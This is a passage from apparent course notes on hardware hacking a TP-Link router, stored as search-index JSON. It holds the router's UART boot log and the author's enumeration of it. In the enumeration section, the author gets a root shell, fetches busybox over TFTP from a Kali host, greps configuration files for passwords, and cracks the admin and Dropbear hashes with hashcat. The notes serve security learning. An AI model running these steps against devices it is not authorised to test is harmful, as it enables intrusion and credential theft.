addr=0xbc010000</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#booting-image-at-bc010000","title":"Booting image at bc010000 ...","text":"<p>Uncompressing Kernel Image ... OK No initrd</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#transferring-control-to-linux-at-address-8000c150","title":"Transferring control to Linux (at address 8000c150) ...","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Beginners_Guide_to_IoT_and_Hardware_Hacking/#giving-linux-memsize-in-mb-32","title":"Giving linux memsize in MB, 32","text":"<p>Starting kernel ...</p> <p>LINUX started...</p> <p>THIS IS ASIC Linux version 2.6.36 (jenkins@mobile-System) (gcc version 4.6.3 (Buildroot 2012.11.1) ) #1 Wed Feb 3 10:13:07 CST 2021</p> <p>The CPU feqenuce set to 575 MHz</p> <p>MIPS CPU sleep mode enabled. CPU revision is: 00019655 (MIPS 24Kc) Software DMA cache coherency Determined physical RAM map: memory: 02000000 @ 00000000 (usable) Initrd not found or empty - disabling initrd Zone PFN ranges: Normal   0x00000000 -&gt; 0x00002000 Movable zone start PFN for each node early_node_map[1] active PFN ranges     0: 0x00000000 -&gt; 0x00002000 Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 8128 Kernel command line: console=ttyS1,115200 root=/dev/mtdblock2 rootfstype=squashfs init=/sbin/init PID hash table entries: 128 (order: -3, 512 bytes) Dentry cache hash table entries: 4096 (order: 2, 16384 bytes) Inode-cache hash table entries: 2048 (order: 1, 8192 bytes) Primary instruction cache 64kB, VIPT, , 4-waylinesize 32 bytes. Primary data cache 32kB, 4-way, PIPT, no aliases, linesize 32 bytes Writing ErrCtl register=00048820 Readback ErrCtl register=00048820 Memory: 29228k/32768k available (2180k kernel code, 3540k reserved, 583k data, 156k init, 0k highmem) NR_IRQS:128 console [ttyS1] enabled Calibrating delay loop... 386.04 BogoMIPS (lpj=772096) pid_max: default: 4096 minimum: 301 Mount-cache hash table entries: 512 NET: Registered protocol family 16 bio: create slab  at 0 Switching to clocksource Ralink Systick timer NET: Registered protocol family 2 IP route cache hash table entries: 1024 (order: 0, 4096 bytes) TCP established hash table entries: 1024 (order: 1, 8192 bytes) TCP bind hash table entries: 1024 (order: 0, 4096 bytes) TCP: Hash tables configured (established 1024 bind 1024) TCP reno registered NET: Registered protocol family 1 squashfs: version 4.0 (2009/01/31) Phillip Lougher msgmni has been set to 57 io scheduler noop registered io scheduler deadline registered (default) Ralink gpio driver initialized Serial: 8250/16550 driver, 2 ports, IRQ sharing enabled serial8250: ttyS0 at MMIO 0x10000d00 (irq = 21) is a 16550A serial8250: ttyS1 at MMIO 0x10000c00 (irq = 20) is a 16550A brd: module loaded flash manufacture id: 1c, device id 70 16 Warning: un-recognized chip ID, please update SPI driver! EN25Q32B(1c 30161c30) (4096 Kbytes) mtd .name = raspi, .size = 0x00400000 (4M) .erasesize = 0x00010000 (64K) .numeraseregions = 0 Creating 5 MTD partitions on \"raspi\": 0x000000000000-0x000000010000 : \"boot\" 0x000000010000-0x000000100000 : \"kernel\" 0x000000100000-0x0000003e0000 : \"rootfs\" mtd: partition \"rootfs\" set to be root filesystem 0x0000003e0000-0x0000003f0000 : \"config\" 0x0000003f0000-0x000000400000 : \"radio\" Register flash device:flash0 PPP generic driver version 2.4.2 PPP MPPE Compression module registered NET: Registered protocol family 24 Mirror/redirect action on u32 classifier     Actions configured Netfilter messages via NETLINK v0.30. nf_conntrack version 0.5.0 (456 buckets, 1824 max) ip_tables: (C) 2000-2006 Netfilter Core Team, Type=Linux TCP cubic registered NET: Registered protocol family 10 ip6_tables: (C) 2000-2006 Netfilter Core Team IPv6 over IPv4 tunneling driver NET: Registered protocol family 17 Ebtables v2.0 registered 802.1Q VLAN Support v1.8 Ben Greear greearb@candelatech.com All bugs added by David S. Miller davem@redhat.com VFS: Mounted root (squashfs filesystem) readonly on device 31:2. Freeing unused kernel memory: 156k freed starting pid 29, tty '': '/etc/init.d/rcS' mount: mounting devpts on /dev/pts failed: No such device rdm_major = 253 spiflash_ioctl_read, Read from 0x003ff100 length 0x6, ret 0, retlen 0x6 Read MAC from flash(  3ff100) ffffffac-15-ffffffa2-5f-fffffff6-ffffffb4 GMAC1_MAC_ADRH -- : 0x0000ac15 GMAC1_MAC_ADRL -- : 0xa25ff6b4 Ralink APSoC Ethernet Driver Initilization. v3.1  256 rx/tx descriptors allocated, mtu = 1500! NAPI enable, Tx Ring = 256, Rx Ring = 256 spiflash_ioctl_read, Read from 0x003ff100 length 0x6, ret 0, retlen 0x6 Read MAC from flash(  3ff100) ffffffac-15-ffffffa2-5f-fffffff6-ffffffb4 GMAC1_MAC_ADRH -- : 0x0000ac15 GMAC1_MAC_ADRL -- : 0xa25ff6b4 PROC INIT OK! add domain:tplinkwifi.net add domain:tplinkap.net add domain:tplinkrepeater.net add domain:tplinklogin.net tp_domain init ok L2TP core driver, V2.0 PPPoL2TP kernel driver, V2.0 Set: phy[0].reg[0] = 3900 Set: phy[1].reg[0] = 3900 Set: phy[2].reg[0] = 3900 Set: phy[3].reg[0] = 3900 Set: phy[4].reg[0] = 3900 Set: phy[0].reg[0] = 3300 Set: phy[1].reg[0] = 3300 Set: phy[2].reg[0] = 3300 Set: phy[3].reg[0] = 3300 Set: phy[4].reg[0] = 3300 resetMiiPortV over. Set: phy[0].reg[4] = 01e1 Set: phy[0].reg[0] = 3300 Set: phy[1].reg[4] = 01e1 Set: phy[1].reg[0] = 3300 Set: phy[2].reg[4] = 01e1 Set: phy[2].reg[0] = 3300 Set: phy[3].reg[4] = 01e1 Set: phy[3].reg[0] = 3300 Set: phy[4].reg[4] = 01e1 Set: phy[4].reg[0] = 3300 turn off flow control over. starting pid 79, tty '/dev/ttyS1': '/bin/sh' ~ # [ util_execSystem ] 141:  ipt_init cmd is \"/var/tmp/dconf/rc.router\" <p>[ dm_readFile ] 2061:  can not open xml file /var/tmp/pc/reduced_data_model.xml!, about to open file /etc/reduced_data_model.xml spiflash_ioctl_read, Read from 0x003e0000 length 0x10000, ret 0, retlen 0x10000 spiflash_ioctl_read, Read from 0x003e0000 length 0xa5e0, ret 0, retlen 0xa5e0 ===&gt;Enter AP modspiflash_ioctl_read, Read from 0x003ff100 length 0x6, ret 0, retlen 0x6 e [ oal_sys_readMaspiflash_ioctl_read, Read from 0x003ff200 length 0x4, ret 0, retlen 0x4 cFlash ] 1958:  spiflash_ioctl_read, Read from 0x003ff300 length 0x4, ret 0, retlen 0x4 3ff100 set flasspiflash_ioctl_read, Read from 0x003ff400 length 0x10, ret 0, retlen 0x10 h mac : AC:15:A2spiflash_ioctl_read, Read from 0x003ff500 length 0x29, ret 0, retlen 0x29 :5F:F6:B4. spiflash_ioctl_read, Read from 0x003ff600 length 0x21, ret 0, retlen 0x21 spiflash_ioctl_read, Read from 0x003ff700 length 0x10, ret 0, retlen 0x10 spiflash_ioctl_read, Read from 0x003ff700 length 0x10, ret 0, retlen 0x10 spiflash_ioctl_read, Read from 0x00010000 length 0x1d0, ret 0, retlen 0x1d0 spiflash_ioctl_read, Read from 0x003ff100 length 0x6, ret 0, retlen 0x6 [ oal_sys_readMacFlash ] 1958:   3ff100 set flash mac : AC:15:A2:5F:F6:B4. sendto: No such file or directory pid 78 send 2001 error [ util_execSystem ] 141:  oal_startDynDns cmd is \"dyndns /var/tmp/dconf/dyndns.conf\"</p> <p>Get SNTP new config [ util_execSystem ] 141:  oal_startNoipDns cmd is \"noipdns /var/tmp/dconf/noipdns.conf\"</p> <p>[ util_execSystem ] 141:  oal_startCmxDns cmd is \"cmxdns /var/tmp/dconf/cmxdns.conf\"</p> <p>ioctl: No such device [ util_execSystem ] 141:  oal_br_addBridge cmd is \"brctl addbr br0;brctl setfd br0 0;brctl stp br0 off\"</p> <p>[ util_execSystem ] 141:  oal_ipt_addLanRules cmd is \"iptables -t filter -A INPUT -i br+ -j ACCEPT \"</p> <p>[ rsl_initLanIpIntfObj ] 1025:  Smart DHCP, use 192.168.0.1/255.255.255.0 as default Static IP at initial stage!</p> <p>[ util_execSystem ] 141:  oal_intf_setIntf cmd is \"Raeth v3.1 (ifconfig br0 192NAPI .168.0.1 netmask,SkbRecycle 255.255.255.0 u) p\"</p> <p>[ util_exe phy_tx_ring = 0x00ca1000, tx_ring = 0xa0ca1000 cSystem ] 141: phy_rx_ring0 = 0x00ca2000, rx_ring0 = 0xa0ca2000 oal_util_setProc[fe_sw_init:5357]rt305x_esw_init. LanAddr cmd is \"echo \"br0 16820416,\" &gt; /proc/net/conntract_LocalAddr\"</p> <p>[ util_execSystem ] 141:  oal_intf_enableIntf cmd is \"ifconfig eth0 up\"</p> <p>disable switch phyport... GMAC1_MAC_ADRH -- : 0x0000ac15 GMAC1_MAC_ADRL -- : 0xa25ff6b4 RT305x_ESW: Link Status Changed [ util_execSystem ] 141:  rsl_initLanEthIntfObj cmd is \"ifconfig eth0 up\"</p> <p>[ util_execSystem ] 141:  oal_br_addIntfIntoBridge cmd is \"brctldevice eth0 entered promiscuous mode addif br0 eth0\"br0: port 1(eth0) entering forwarding state</p> <p>br0: port 1(eth0) entering forwarding state [ util_execSystem ] 141:  oal_addVlanTagIntf cmd is \"vconfig add eth0 3\"</p> <p>[ util_execSystem ] 141:  oal_intf_enableIntf cmd is \"ifconfig eth0.3 up\"</p> <p>set if eth0.3 to *not wan dev [ util_execSystem ] 141:  oal_br_device eth0.3 entered promiscuous mode addIntfIntoBridgbr0: port 2(eth0.3) entering forwarding state e cmd is \"brctl br0: port 2(eth0.3) entering forwarding state addif br0 eth0.3\"</p> <p>[ util_execSystem ] 141:  oal_addVlanTagIntf cmd is \"vconfig add eth0 4\" [ util_execSystem ] 141:  oal_addVlanTagIntf cmd is \"vconfig add eth0 4\"</p> <p>[ util_execSystem ] 141:  oal_intf_enableIntf cmd is \"ifconfig eth0.4 up\"</p> <p>set if eth0.4 to *not wan dev [ util_execSystem ] 141:  oal_br_device eth0.4 entered promiscuous mode addIntfIntoBridgbr0: port 3(eth0.4) entering forwarding state e cmd is \"brctl br0: port 3(eth0.4) entering forwarding state addif br0 eth0.4\"</p> <p>[ util_execSystem ] 141:  oal_addVlanTagIntf cmd is \"vconfig add eth0 5\"</p> <p>[ util_execSystem ] 141:  oal_intf_enableIntf cmd is \"ifconfig eth0.5 up\"</p> <p>set if eth0.5 to *not wan dev [ util_execSystem ] 141:  oal_br_device eth0.5 entered promiscuous mode addIntfIntoBridgbr0: port 4(eth0.5) entering forwarding state e cmd is \"brctl br0: port 4(eth0.5) entering forwarding state addif br0 eth0.5\"</p> <p>[ util_execSystem ] 141:  oal_addVlanTagIntf cmd is \"vconfig add eth0 6\"</p> <p>[ util_execSystem ] 141:  oal_intf_enableIntf cmd is \"ifconfig eth0.6 up\"</p> <p>set if eth0.6 to *not wan dev [ util_execSystem ] 141:  oal_br_device eth0.6 entered promiscuous mode addIntfIntoBridgbr0: port 5(eth0.6) entering forwarding state e cmd is \"brctl br0: port 5(eth0.6) entering forwarding state addif br0 eth0.6\"</p> <p>[ util_execSystem ] 141:  oal_addVlanTagIntf cmd is \"vconfig add eth0 7\"</p> <p>[ util_execSystem ] 141:  oal_intf_enableIntf cmd is \"ifconfig eth0.7 up\"</p> <p>set if eth0.7 to *not wan dev [ util_execSystem ] 141:  oal_br_device eth0.7 entered promiscuous mode addIntfIntoBridgbr0: port 6(eth0.7) entering forwarding state e cmd is \"brctl br0: port 6(eth0.7) entering forwarding state addif br0 eth0.7\"</p> <p>[ util_execSystem ] 141:  oal_br_delIntfFromBridge cmd is \"br0: port 1(eth0) entering forwarding state brctl delif br0 eth0\"</p> <p>[ util_execSystem ] 141:  oal_eth_setIGMPSnoopParam cmd is \"for i in /sys/devices/virtual/net/*/bridge/multicast_snooping;do echo 1 &gt; $i ; done\"</p> <p>[ util_execSystem ] 141:  rsl_initApIgmpSnoop cmd is \"for i in /sys/devices/virtual/net/*/bridge/igmp_query_version; do echo 3 &gt; $i; done\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setCountryRegion cmd is \"cp /etc/SingleSKU_FCC.dat /var/Wireless/RT2860AP/SingleSKU.dat\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setCountryRegion cmd is \"iwpriv ra0 set CountryRegion=0\"</p> <p>ra0       no private ioctls.</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_loadDriver cmd is \"insmod /lib/modules/kmdir/kernel/drivers/net/wireless/mt_wifi_ap/mt_wifi.ko\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_initWlan cmd is \"ifconfig ra0 up\"</p> <p>[RTMPReadParametersHook:297]wifi read profile faild.</p> <p>efuse_probe: efuse = 10000012 exec! spiflash_ioctl_read, Read from 0x003f0000 length 0x400, ret 0, retlen 0x400 eeFlashId = 0x7628! tssi_1_target_pwr_g_band = 36 [ util_execSystem ] 141:  oal_wlan_ra_initWlan cmd is \"echo 1 &gt; /proc/tplink/led_wlan_24G\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_initWlan cmd is \"iwpriv ra0 set ed_chk=0\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setStaNum cmd is \"iwpriv ra0 set MaxStaNum=32\"</p> [ util_execSystem ] 141device ra0 entered promiscuous mode oal_br_addIntbr0: port 1(ra0) entering forwarding state fIntoBridge cmd br0: port 1(ra0) entering forwarding state is \"brctl addif br0 ra0\" <p>[ util_execSystem ] 141:  oal_br_addIntfIntoBridge cdevice apcli0 entered promiscuous mode md is \"brctl addif br0 apcli0\"</p> <p>[ util_execSystem ] 141:  oal_br_addIntfIntoBrdevice ra1 entered promiscuous mode idge cmd is \"brctl addif br0 ra1\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_initEspiflash_ioctl_read, Read from 0x003f0000 length 0x2, ret 0, retlen 0x2 nd cmd is \"wlNetlinkTool &amp;\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_initEnd cmd is \"killall -q wscd\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_initEnd cmd is \"wscd -i ra0 -m 1 -w /var/tmp/wsc_upnp/ &amp;\"</p> <p>[ util_execSystem ] 141:  rsl_initLanWlanObj cmd is \"echo 1 &gt; /proc/tplink/wl_mode\"</p> <p>WLAN-Start wlNetlinkTool Waiting for Wireless Events from interfaces... swWlanChkAhbErr: netlink to do [ oal_wlan_ra_loadDriver ] 2119:  no 5G chip.</p> <p>[ rsl_initLanWlanObj ] 9620:  perror:1 wscd: SSDP UDP PORT = 1900 [ util_execSystem ] 141:  oal_ipt_setWanPort cmd is \"iptables -t filter -A INPUT -p tcp --dport 80 -j ACCEPT\"</p> <p>[ util_execSystem ] 141:  oal_ipt_setWanPort cmd is \"iptables -t nat -I PREROUTING 1 -p tcp --dport 80 -j ACCEPT\"</p> <p>sendto: No such file or directory pid 78 send 2004 error [ util_execSystem ] 141:  oal_startDhcps cmd is \"dhcpd /var/tmp/dconf/udhcpd.conf\"</p> <p>iptables: Bad rule (does a matching rule exist in that chain?). [ rsl_initAppObj ] 1038:  ===&gt;Smart DHCP, use 192.168.0.1/255.255.255.0 as default Static IP at initial stage!</p> <p>[ util_execSystem ] 141:  oal_intf_setIntf cmd is \"ifconfig br0 192.168.0.1 netmask 255.255.255.0 up\"</p> <p>[ util_execSystem ] 141:  oal_util_setProcLanAddr cmd is \"echo \"br0 16820416,\" &gt; /proc/net/conntract_LocalAddr\"</p> <p>[ rsl_initAppObj ] 1055:  lanCfgObj.IPRouters 192.168.0.1, lanCfgObj.X_TP_RemoteDns 192.168.0.1,0.0.0.0, lanCfgObj.DNSServers 192.168.0.1,0.0.0.0, lanCfgObj.minAddress 192.168.0.100, lanCfgObj.maxAddress 192.168.0.199.</p> <p>[ rsl_initAppObj ] 1068:  ==&gt; start dhcp client</p> <p>iptables: Bad rule (does a matching rule exist in that chain?). [ util_execSystem ] 141:  oal_ipt_fwDdos cmd is \"iptables -D FORWARD -j FIREWALL_DDOS \"</p> <p>iptables: No chain/target/match by that name. [ util_execSystem ] 141:  oal_ipt_forbidLanPing cmd is \"iptables -t filter -D INPUT -i br+ -p icmp --icmp-type echo-request -j DROP iptables -t filter -D FORWARD -i br+ -p icmp --icmp-type echo-request -j DROP \"</p> <p>iptables: Bad rule (does a matching rule exist in that chain?). iptables: Bad rule (does a matching rule exist in that chain?). [ util_execSystem ] 141:  oal_ddos_delPingRule cmd is \"iptables -t filter -D INPUT ! -i br+ -p icmp --icmp-type echo-request -j ACCEPT \"</p> <p>iptables: Bad rule (does a matching rule exist in that chain?). [ util_execSystem ] 141:  oal_ipt_setDDoSRules cmd is \"iptables -F FIREWALL_DDOS\"</p> <p>[ util_execSystem ] 141:  ddos_clearAll cmd is \"rm -f /var/tmp/dosHost\"</p> <p>sh: diagTool: not found [ util_execSystem ] 141:  oal_initFirewallObj cmd is \"ebtables -N FIREWALL\"</p> <p>[ util_execSystem ] 141:  setupModules cmd is \"insmod /lib/modules/kmdir/kernel/net/netfilter/nf_conntrack_ftp.ko\"</p> <p>[ util_execSystem ] 141:  setupModules cmd is \"insmod /lib/modules/kmdir/kernel/net/ipv4/netfilter/nf_nat_ftp.ko\"</p> <p>[ util_execSystem ] 141:  oal_openAlg cmd is \"iptables -D FORWARD_VPN_PASSTHROUGH  -p udp --dport 500 -j DROP\"</p> <p>iptables: Bad rule (does a matching rule exist in that chain?). [ util_execSystem ] 141:  setupModules cmd is \"insmod /lib/modules/kmdir/kernel/net/ipv4/netfilter/nf_nat_proto_gre.ko\"</p> <p>[ util_execSystem ] 141:  setupModules cmd is \"insmod /lib/modules/kmdir/kernel/net/ipv4/netfilter/nf_nat_pptp.ko\"</p> <p>[ util_execSystem ] 141:  oal_openAlg cmd is \"iptables -D FORWARD_VPN_PASSTHROUGH  -p tcp --dport 1723 -j DROP\"</p> <p>iptables: Bad rule (does a matching rule exist in that chain?). [ util_execSystem ] 141:  oal_openAlg cmd is \"iptables -D FORWARD_VPN_PASSTHROUGH  -p udp --dport 1701 -j DROP\"</p> <p>iptables: Bad rule (does a matching rule exist in that chain?). [ util_execSystem ] 141:  setupModules cmd is \"insmod /lib/modules/kmdir/kernel/net/netfilter/nf_conntrack_tftp.ko\"</p> <p>[ util_execSystem ] 141:  setupModules cmd is \"insmod /lib/modules/kmdir/kernel/net/ipv4/netfilter/nf_nat_tftp.ko\"</p> <p>[ util_execSystem ] 141:  setupModules cmd is \"insmod /lib/modules/kmdir/kernel/net/netfilter/nf_conntrack_h323.ko\"</p> <p>[ util_execSystem ] 141:  setupModules cmd is \"insmod /lib/modules/kmdir/kernel/net/ipv4/netfilter/nf_nat_h323.ko\"</p> <p>[ util_execSystem ] 141:  setupModules cmd is \"insmod /lib/modules/kmdir/kernel/net/netfilter/nf_conntrack_sip.ko\"</p> <p>[ util_execSystem ] 141:  setupModules cmd is \"insmod /lib/modules/kmdir/kernel/net/ipv4/netfilter/nf_nat_sip.ko\"</p> <p>[ util_execSystem ] 141:  setupModules cmd is \"insmod /lib/modules/kmdir/kernel/net/netfilter/nf_conntrack_rtsp.ko\"</p> <p>[ util_execSystem ] 141:  setupModules cmd is \"insmod /lib/modules/kmdir/kernel/net/ipv4/netfilter/nf_nat_rtsp.ko\"</p> <p>nf_nat_rtsp v0.6.21 loading [ util_execSystem ] 141:  rsl_initPingWatchDogObj cmd is \"pwdog &amp;\"</p> <p>enable switch phyport... Set: phy[0].reg[0] = 3900 Set: phy[1].reg[0] = 3900 Set: phy[2].reg[0] = 3900 Set: phy[3].reg[0] = 3900 Set: phy[4].reg[0] = 3900 Set: phy[0].reg[0] = 3300 Set: phy[1].reg[0] = 3300 Set: phy[2].reg[0] = 3300 Set: phy[3].reg[0] = 3300 Set: phy[4].reg[0] = 3300 resetMiiPortV over. Set: phy[0].reg[4] = 01e1 Set: phy[0].reg[0] = 3300 [cmd_dutInit():1094] init shm [tddp_taskEntry():151] tddp task start Set: phy[1].reg[4] = 01e1 Set: phy[1].reg[0] = 3300 Set: phy[2].reg[4] = 01e1 Set: phy[2].reg[0] = 3300 Set: phy[3].reg[4] = 01e1 Set: phy[3].reg[0] = 3300 Set: phy[4].reg[4] = 01e1 Set: phy[4].reg[0] = 3300 turn off flow control over. [ read_dhcpc_config ] 113: error, unable to open config file: /var/tmp/dconf/udhcpc.conf [ util_execSystem ] 141:  prepareDropbear cmd is \"dropbearkey -t rsa -f /var/tmp/dropbear/dropbear_rsa_host_key\"</p> <p>Will output 1024 bit rsa secret key to '/var/tmp/dropbear/dropbear_rsa_host_key' Generating key, this may take a while... [ util_execSystem ] 141:  prepareDropbear cmd is \"dropbearkey -t dss -f /var/tmp/dropbear/dropbear_dss_host_key\"</p> <p>Will output 1024 bit dss secret key to '/var/tmp/dropbear/dropbear_dss_host_key' Generating key, this may take a while... [ util_execSystem ] 141:  prepareDropbear cmd is \"dropbear -p 22 -r /var/tmp/dropbear/dropbear_rsa_host_key -d /var/tmp/dropbear/dropbear_dss_host_key -A /var/tmp/dropbear/dropbearpwd\"</p> <p>start ntp_request [ oal_sys_getOldTZInfo ] 592:  Open TZ file error! [ util_execSystem ] 141:  oal_sys_unsetTZ cmd is \"echo \"\" &gt; /etc/TZ\"</p> <p>Some key information of note from the boot logs were:</p> <p>Bootloader:</p> <p>Appears to be a repurposed build of open source version U-Boot 1.1.3 (Feb 3 2021 - 10:10:08), denoted as Ralink UBoot Version: 4.3.0.0</p> <p>Bootloader default selected 3: System Boot system code via Flash.(0xbc010000) as the boot option, may be able to interrupt boot process and select another boot option</p> <p>Linux Initialization:</p> <p>Version: Linux version 2.6.36 (jenkins@mobile-System) (gcc version 4.6.3 (Buildroot 2012.11.1) ) #1 Wed Feb 3 10:13:07 CST 2021</p> <p>CPU Information: CPU revision is: 00019655 (MIPS 24Kc)</p> <p>Kernel Command Line: Kernel command line: console=ttyS1,115200 root=/dev/mtdblock2 rootfstype=squashfs init=/sbin/init</p> <p>Shows the console being set to ttyS1 with a baud rate of 115200 (this is the console session we are connected to). Show the root file system as type squashfs which is a compressed read-only file system. Show the initialization bin is /sbin/init.</p> <p>Boot Partition Details:</p> <p>EN25Q32B(1c 30161c30) (4096 Kbytes)</p> <p>mtd .name = raspi, .size = 0x00400000 (4M) .erasesize = 0x00010000 (64K) .numeraseregions = 0</p> <p>Creating 5 MTD partitions on \"raspi\":</p> <p>0x000000000000-0x000000010000 : \"boot\"</p> <p>0x000000010000-0x000000100000 : \"kernel\"</p> <p>0x000000100000-0x0000003e0000 : \"rootfs\"</p> <p>mtd: partition \"rootfs\" set to be root filesystem</p> <p>0x0000003e0000-0x0000003f0000 : \"config\"</p> <p>0x0000003f0000-0x000000400000 : \"radio\"</p> <p>Identifies flash chip as EN25Q32B (the same chip we ID'd in initial recon)</p> <p>Shows the partition of the ROM.</p> <p>Initialization Script: starting pid 29, tty '': '/etc/init.d/rcS'</p> <p>Shows the location of the initialization script.</p> <p>Configuration Files:</p> <p>Multiple configuration files are listed for use during start-up, the below appears to be a main configuration file.</p> <p>[ dm_readFile ] 2061: can not open xml file /var/tmp/pc/reduced_data_model.xml!, about to open file /etc/reduced_data_model.xml</p> <p>Dropbear:</p> <p>Multiple details about Dropbear initialization including the below line also reveal what is most likely a writeable filepath.</p> <p>[ util_execSystem ] 141: prepareDropbear cmd is \"dropbearkey -t rsa -f /var/tmp/dropbear/dropbear_rsa_host_key\"</p> <p>Interrupting Bootloader Through online research, it was discovered that the bootloader interrupt command is \"tpl\". There is a very small window to interrupt the bootloader so the easiest way to do it is to issue a reboot command and then immediately being typing \"tpl\" repeatedly.</p> <p>~ # reboot The system is going down NOW! Sent SIGTERM to all processes Terminated Sent SIGKILL toRestarting system.</p> <p>Doing so interrupted the bootloader and provided access to the bootloaders Command Line Interface.</p> <p>switch BootType:</p> <p>4: System Enter Boot Command Line Interface.</p> <p>U-Boot 1.1.3 (Feb  3 2021 - 10:10:08) MT7628 # help    Unknown command 'help' - try 'help' MT7628 #   </p> <p>Usually this CLI provides access to tools to read and write to memory, set environment details and gather further information about the board. Unfortunately, the repurposed version of U-Boot has removed this functionality. The only functionality remaining is to perform a TFTP boot. This can be done to boot from firmware over the network as a recovery method.</p> <p>Enumeration via UART Shell Pressing Enter revealed there was shell access with no login as root user:</p> <p>Checking over the available binaries in the bin folder, busybox was discovered:</p> <p>Busybox is a popular binary used on embedded systems as it packages many common Linux/Unix binaries into one smaller package.</p> <p>Observing the available functions in busybox it was noted that this appears to be a stripped-down version of Busybox, however, TFTP was still available.</p> <p>Transferring Full Version of Busybox over TFTP The full version of Busybox was downloaded from: https://busybox.net/downloads/binaries/</p> <p>The TFTP from the existing busybox was then used to transfer over the full version of busybox.</p> <p>Command From Kali VM to start TFTP server as daemon: sudo atftpd --daemon</p> <p>Created a folder to transfer over tools in /var/tmp/_tools /var was previously identified as writable.</p> <p>Command from Router to initiate file transfer: tftp -r busybox-mipsel -g 192.168.0.100</p> <p>The full version of busybox was then available to use for further enumeration.</p> <p>Enumerating /var folder Using the new full version of Busybox grep was utilized to search for files with \"pass\" in it in order to identify possible hardcoded passwords.</p> <p>Command: /var/temp/_tools/busybox-mipsel grep -r 'pass' .</p> <p>Noted three config files that may contain passwords and what appears to be a hashed password for Dropbear.</p> <p>Config file passwords were blank, Dropbear hash was saved to attempt to crack at a later time.</p> <p>Command: /var/temp/_tools/busybox-mipsel grep -r 'pass' .</p> <p>Command: /var/temp/_tools/busybox-mipsel find -name '*.xml'</p> <p>Command: /var/temp/_tools/busybox-mipsel find -name '*.conf'</p> <p>Further enumeration of the config files did not reveal any additional useful information.</p> <p>Cracking Password Hashes Admin hash from passwd file was identified as Unix Md5 hash and cracked using the below command.</p> <p>Command on Kali VM: hashcat -a 0 -m 500 admin.hash /usr/share/wordlists/rockyou.txt</p> <p>Admin Password cracked as \"1234\"</p> <p>Dropbear hash form dropbearpasswd file was identified as normal MD5 hash and cracked using the below command.</p> <p>Command on Kali VM: hashcat -a 0 -m 0 dropbear.hash /usr/share/wordlists/rockyou.txt</p> <p>Dropbear password was cracked \"1234qwer\" this was noted to be the password that was created for the admin login of the router via the browser.</p> <p>The password file is dynamically created on startup from the router's admin password.</p> <p>Checking Running Processes and Network Connections The busybox binary transferred was used again to check the running processes via ps.</p> <p>Command: /var/temp/_tools/busybox-mipsel ps</p> <p>Noted that all processes were running as the admin user and there was no principle of least privilege being followed.</p> <p>The same process was followed to check running processes using netstat.</p> <p>Command: /var/temp/_tools/busybox-mipsel netstat</p> <p>Prompting Additional Console Log Messages Looking through the unprompted console log messages one repeating log message stood out:</p> <p>A repeated call by [ util_execSystem ] appears to be indicative of a log from a function in a shared object library.</p> <p>It also appears to be a system call which is a c function that allows the running of a system command. These can be dangerous in nature for command injection if the function uses user input.</p> <p>These console log messages, especially those which allow tracing back to specific functions can allow for easier reverse engineering. To test this the wireless setup of the router was performed using the web portal.</p> <p>This triggered many console logs that showed the use of the execSystem function for user-supplied inputs.</p> <p>[ rsl_sendAppWlanCfg ] 1232:  Tell TMPD server that wlan/guest cfg has been c hanged.</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setWlanBasicCfg cmd is \"iwpriv ra0 set  CountryCode=US_NOCOUNTRY\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setCountryRegion cmd is \"cp /etc/Single SKU_FCC.dat /var/Wireless/RT2860AP/SingleSKU.dat\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setCountryRegion cmd is \"iwpriv ra0 set CountryRegion=0\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setWlanBasicCfg cmd is \"iwpriv ra0 set  WirelessMode=9\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setWlanBasicCfg cmd is \"iwpriv ra0 set  HtBw=1\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setWlanBasicCfg cmd is \"iwpriv ra0 set  HtBssCoex=0\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setWlanBasicCfg cmd is \"iwpriv ra0 set AutoChannelSel=2\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setWlanBasicCfg cmd is \"iwpriv ra0 set Channel=0\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setWlanBasicCfg cmd is \"iwpriv ra0 set SSID='i''o''t''h''a''c''k''i''n''g'\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setWlanAdvCfg cmd is \"iwpriv ra0 set TxPower=100\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setWlanAdvCfg cmd is \"iwpriv ra0 set BeaconPeriod=100\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setWlanAdvCfg cmd is \"iwpriv ra0 set RTSThreshold=2346\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setWlanAdvCfg cmd is \"iwpriv ra0 set FragThreshold=2346\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setWlanAdvCfg cmd is \"iwpriv ra0 set DtimPeriod=1\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setWlanAdvCfg cmd is \"iwpriv ra0 set HtGi=1\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setWlanAdvCfg cmd is \"iwpriv ra0 set HideSSID=0\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setWlanAdvCfg cmd is \"iwpriv ra0 set WmmCapable=1\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setWlanAdvCfg cmd is \"iwpriv ra0 set NoForwarding=0\"</p> <p>[ util_execSystem ] 141:  oal_wlan_ra_setSec cmd is \"iwpriv ra0 set AuthMode=WPA2PSK\"</p> <p>[ 